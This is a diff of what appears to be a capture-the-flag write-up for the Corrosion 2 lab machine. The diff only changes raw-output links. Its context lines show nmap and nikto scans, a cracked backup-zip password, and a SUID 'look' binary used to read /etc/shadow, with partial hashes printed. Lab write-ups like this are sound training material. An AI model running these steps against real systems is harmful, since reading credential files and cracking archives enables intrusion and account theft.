@@ -15,7 +15,7 @@ status: "complete"
 
 <TerminalOutput
   cmd="nmap -A -T5 10.0.0.21"
-  rawHref="/writeups/raw/corrosion-2/nmap.txt"
+  rawHref="/writeups/raw/corrosion-2/nmap"
   output={`PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
 80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu default page)
@@ -32,7 +32,7 @@ Nikto on port 8080 flags two things immediately.
 
 <TerminalOutput
   cmd="nikto -h http://10.0.0.21:8080"
-  rawHref="/writeups/raw/corrosion-2/nikto-8080.txt"
+  rawHref="/writeups/raw/corrosion-2/nikto-8080"
   output={`+ /backup.zip: Potentially interesting backup/cert file found.
 + /readme.txt: This might be interesting.
 + /manager/html: Tomcat Manager / Host Manager interface found (pass protected).`}
@@ -54,7 +54,7 @@ Username `randy`, and there's a file left on the server. The backup zip is right
 
 <TerminalOutput
   cmd="zip2john backup.zip > ziphash.txt && john --wordlist=rockyou.txt ziphash.txt"
-  rawHref="/writeups/raw/corrosion-2/zip-crack.txt"
+  rawHref="/writeups/raw/corrosion-2/zip-crack"
   output={`@administrator_hi5  (backup.zip)`}
 />
 
@@ -132,7 +132,7 @@ jaye's `Files/` directory has a SUID root binary:
 
 <TerminalOutput
   cmd="./look '' /etc/shadow"
-  rawHref="/writeups/raw/corrosion-2/shadow-randy.txt"
+  rawHref="/writeups/raw/corrosion-2/shadow-randy"
   output={`root:$6$fHvHhNo5DWsYxgt0$...
 randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/...
 jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/...`}
